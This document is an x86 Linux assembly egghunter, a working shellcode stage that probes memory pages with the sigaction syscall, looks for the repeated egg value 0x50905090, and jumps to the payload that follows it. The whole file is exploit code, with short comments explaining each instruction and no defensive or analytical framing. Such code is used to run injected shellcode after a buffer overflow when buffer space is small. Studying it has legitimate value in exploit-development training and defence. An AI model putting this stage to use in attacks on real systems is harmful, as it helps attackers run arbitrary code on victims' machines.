global _start

section .text

_start:

	XOR ecx, ecx

next_page:

	OR cx, 0xfff			;set cx to 4095
next_address:
	inc ecx 				;increase cx to 4096 (PAGE_SIZE)
	push byte +0x43			;Load syscall number 0x43 (syscall for sigaction) onto stack
	pop eax					;Populate EAX with syscall number
	int 0x80				;Execute syscall
	cmp al, 0xf2			;check if return value is EFAULT (0xf2)
	jz next_page			;if so, jump back to next_page label
	mov eax, 0x50905090		;Load our unique egg in EAX
	mov edi, ecx 			
	scasd					;search for first part of egg
	jnz next_address        ;if not found jump to next address
	scasd					;search for second occurence of egg
	jnz next_address		;if not found jump to next address
	jmp edi					;if found jump to the payload shellcode
